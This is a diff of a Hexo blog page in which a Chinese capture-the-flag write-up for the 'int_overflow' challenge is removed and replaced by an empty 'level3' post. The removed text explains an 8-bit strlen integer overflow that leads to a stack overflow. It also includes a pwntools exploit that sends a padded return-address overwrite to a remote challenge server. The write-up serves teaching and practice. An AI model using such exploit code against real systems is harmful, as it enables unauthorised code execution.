@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="pwn,">
+  <meta name="keywords" content="Hexo, NexT">
 
 
 
@@ -81,22 +81,14 @@
 
 
 
-<meta name="description" content="0x01 寻找漏洞12345678xfgg@ubuntu:~/Downloads$ checksec int_overflow[*] &apos;/home/xfgg/Downloads/int_overflow&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:">
-<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="int_overflow">
-<meta property="og:url" content="http://yoursite.com/2019/07/27/int_overflow/index.html">
+<meta property="og:title" content="xfgg">
+<meta property="og:url" content="http://yoursite.com/2019/07/27/level3/index.html">
 <meta property="og:site_name" content="xfgg">
-<meta property="og:description" content="0x01 寻找漏洞12345678xfgg@ubuntu:~/Downloads$ checksec int_overflow[*] &apos;/home/xfgg/Downloads/int_overflow&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://raw.githubusercontent.com/xfgg/xfgg.github.io/master/images/int_overflow1.png">
-<meta property="og:image" content="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow2.png?raw=true">
-<meta property="og:image" content="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow3.png?raw=true">
-<meta property="og:updated_time" content="2019-07-27T07:41:43.015Z">
+<meta property="og:updated_time" content="2019-07-27T11:16:30.503Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="int_overflow">
-<meta name="twitter:description" content="0x01 寻找漏洞12345678xfgg@ubuntu:~/Downloads$ checksec int_overflow[*] &apos;/home/xfgg/Downloads/int_overflow&apos;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/xfgg/xfgg.github.io/master/images/int_overflow1.png">
+<meta name="twitter:title" content="xfgg">
 
 
 
@@ -126,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/27/int_overflow/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/27/level3/">
 
 
 
 
 
-  <title>int_overflow | xfgg</title>
+  <title> | xfgg</title>
   
 
 
@@ -259,7 +251,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/int_overflow/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/27/level3/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -276,7 +268,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">int_overflow</h1>
+          <h1 class="post-title" itemprop="name headline"></h1>
         
 
         <div class="post-meta">
@@ -288,7 +280,7 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T15:04:06+08:00">
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-27T19:16:30+08:00">
                 2019-07-27
               </time>
             
@@ -298,28 +290,6 @@
             
           </span>
 
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/攻防世界/" itemprop="url" rel="index">
-                    <span itemprop="name">攻防世界</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -348,22 +318,7 @@
       
 
       
-        <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec int_overflow</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/int_overflow'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">只开启了nx保护</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/xfgg/xfgg.github.io/master/images/int_overflow1.png" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">read</span> 函数处可以进行溢出，但是需要经过 check_passwd 函数才能将跳出login。现在再看一下 check_passwd 函数内部，</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow2.png?raw=true" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = strlen(s);造成整数溢出的一个点，我们再看一下此处的汇编代码。</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/xfgg/xfgg.github.io/blob/master/images/int_overflow3.png?raw=true" alt></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call strlen 之后 返回值放在了al寄存器中，这是一个八位的积存器，也就是说如果 s 字符串的长度 大于255 就会造成 整数溢出。 再加上四字节就可以溢出</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们需要进到<span class="keyword">else</span>里，将 <span class="built_in">read</span> 读进来的 s 复制到 dest 中，是一个可以利用的栈溢出。</span><br><span class="line">现在我们知道了可以通过整数溢出到达 栈溢出漏洞，修改程序执行流，使程序跳转到 what_is_this 中。</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x03-攻击"><a href="#0x03-攻击" class="headerlink" title="0x03 攻击"></a>0x03 攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈溢出漏洞 加一个整数漏洞</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'111.198.29.45'</span>,44825)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"choice:"</span>,<span class="string">"1"</span>) </span><br><span class="line">p.sendlineafter(<span class="string">"username:\n"</span>,<span class="string">"2"</span>)</span><br><span class="line">sys_addr = 0x0804868b</span><br><span class="line">payload = <span class="string">'a'</span>*0x14+<span class="string">'a'</span>*4+p32(sys_addr)</span><br><span class="line">payload = payload.ljust(259,<span class="string">"A"</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"passwd:\n"</span>,payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+        
       
     </div>
     
@@ -378,12 +333,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/pwn/" rel="tag"># pwn</a>
-          
-        </div>
-      
 
       
       
@@ -393,8 +342,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/27/cgpwn2/" rel="next" title="cgpwn2">
-                <i class="fa fa-chevron-left"></i> cgpwn2
+              <a href="/2019/07/27/pwn1/" rel="next" title="forgot">
+                <i class="fa fa-chevron-left"></i> forgot
               </a>
             
           </div>
@@ -402,10 +351,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/07/27/dice game/" rel="prev" title="dice game">
-                dice game <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -457,17 +402,8 @@
       
 
       
-        <ul class="sidebar-nav motion-element">
-          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
-            Table of Contents
-          </li>
-          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-            Overview
-          </li>
-        </ul>
-      
 
-      <section class="site-overview-wrap sidebar-panel">
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -534,22 +470,6 @@
         </div>
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-寻找漏洞"><span class="nav-number">1.</span> <span class="nav-text">0x01 寻找漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-思路分析"><span class="nav-number">2.</span> <span class="nav-text">0x02 思路分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-攻击"><span class="nav-number">3.</span> <span class="nav-text">0x03 攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
